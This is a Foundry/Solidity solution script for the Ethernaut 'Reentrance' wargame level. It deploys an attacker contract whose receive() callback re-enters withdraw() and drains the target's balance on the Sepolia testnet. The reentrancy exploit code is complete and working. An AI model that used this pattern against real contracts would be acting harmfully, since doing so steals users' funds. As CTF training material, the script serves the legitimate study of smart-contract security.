// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/levels/Reentrance.sol";

/*
    Solution script for the Ethernaut Level 10: Reentrance

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in ReentranceScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Reentrance.s.sol:ReentranceScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Reentrance.s.sol/11155111
*/

contract ReentranceAttack {
    Reentrance level10;
    constructor (address payable _target) public payable {
        level10 = Reentrance(payable(_target));
    }

    function donate() external payable {
        level10.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external{
        level10.withdraw(0.001 ether);
    }

    function getBalance(address _who) external view returns (uint){
        return address(_who).balance;
    }

    function fundmeback(address payable _to) external payable{
        require(_to.send(address(this).balance), "could not send Ether");
    }

    receive() external payable {
        level10.withdraw(msg.value);
    }
}


contract ReentranceScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0x512b8aDC9A213DCB9f0079DAa9BA3927cBB1aCE5);

    function run() external {
        vm.startBroadcast();

        uint256 balance = msg.sender.balance;
        // console.log("instance.balance: ", instance.balance);
        // console.log("attacker balance: ", msg.sender.balance);
        // console.log("address(attacker).balance: ", address(attacker).balance);
        
        ReentranceAttack attacker = new ReentranceAttack{value: 0.001 ether}(instance);

        attacker.donate();
        attacker.withdraw();
        attacker.fundmeback(msg.sender);

        require(instance.balance == 0, 'target contract balance not drained');
        require(address(attacker).balance == 0, 'attacker contract balance not returned to attacker EOA');
        require(msg.sender.balance > balance, 'attacker balance has not increased');

        // console.log("instance.balance: ", instance.balance);
        // console.log("address(attacker).balance: ", address(attacker).balance);
        // console.log("attacker balance: ", msg.sender.balance);
    
        vm.stopBroadcast();
    }
}